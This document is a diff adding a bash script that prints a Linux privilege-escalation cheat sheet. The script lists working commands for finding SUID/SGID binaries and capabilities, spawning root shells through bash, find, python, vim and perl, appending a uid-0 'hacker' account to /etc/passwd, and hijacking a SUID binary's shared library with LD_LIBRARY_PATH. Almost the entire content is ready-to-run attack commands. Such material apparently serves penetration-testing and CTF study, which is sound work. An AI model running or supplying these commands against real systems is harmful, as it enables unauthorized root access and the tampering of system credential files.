@@ -1,0 +1,63 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── SUID / GTFOBins / CAPABILITIES ───────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Find SUID / SGID Binaries ────────────────────────${NC}"
+echo -e "  ${GREEN}find / -perm -u=s -type f 2>/dev/null${NC}             # SUID"
+echo -e "  ${GREEN}find / -perm -4000 -type f 2>/dev/null${NC}            # SUID (numeric)"
+echo -e "  ${GREEN}find / -perm -g=s -type f 2>/dev/null${NC}             # SGID"
+echo -e "  ${GREEN}find / -perm -u=s -o -perm -g=s -type f 2>/dev/null${NC}  # both"
+echo -e "  ${BLUE}https://gtfobins.github.io${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Common SUID Exploits ──────────────────────────────${NC}"
+echo -e "  Note: [bash SUID]"
+echo -e "  ${GREEN}/bin/bash -p${NC}                                       # effective root"
+printf "\n"
+echo -e "  Note: [find SUID]"
+echo -e "  ${GREEN}/usr/bin/find . -exec bash -p \\; -quit${NC}"
+echo -e "  ${GREEN}/usr/bin/find . -exec /bin/sh -p \\; -quit${NC}"
+printf "\n"
+echo -e "  Note: [python SUID]"
+echo -e "  ${GREEN}/usr/bin/python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'${NC}"
+printf "\n"
+echo -e "  Note: [cp SUID — overwrite passwd]"
+echo -e "  ${GREEN}openssl passwd -1 hacker${NC}                          # generate hash"
+echo -e "  ${GREEN}cp /etc/passwd /tmp/passwd.bak${NC}"
+echo -e "  ${GREEN}echo 'hacker:\$1\$...\$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd${NC}"
+printf "\n"
+echo -e "  Note: [vim SUID]"
+echo -e "  ${GREEN}/usr/bin/vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Linux Capabilities ───────────────────────────────${NC}"
+echo -e "  ${GREEN}getcap -r / 2>/dev/null${NC}                           # find capabilities"
+printf "\n"
+echo -e "  ${BLUE}cap_setuid+ep${NC}              -> os.setuid(0)"
+echo -e "  ${BLUE}cap_net_raw+ep${NC}             -> raw socket sniff (Wireshark equiv)"
+echo -e "  ${BLUE}cap_dac_read_search+ep${NC}     -> read any file"
+printf "\n"
+echo -e "  Note: [python3 + cap_setuid]"
+echo -e "  ${GREEN}/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'${NC}"
+printf "\n"
+echo -e "  Note: [perl + cap_setuid]"
+echo -e "  ${GREEN}perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Shared Library Hijacking (LD_LIBRARY_PATH) ───────${NC}"
+echo -e "  ${GREEN}ldd /usr/local/bin/suid-binary${NC}                    # find libraries"
+echo -e "  Note: Create fake library with matching function name"
+echo -e "  ${GREEN}gcc -shared -fPIC -o /tmp/libcustom.so /tmp/evil.c${NC}"
+echo -e "  ${GREEN}LD_LIBRARY_PATH=/tmp /usr/local/bin/suid-binary${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
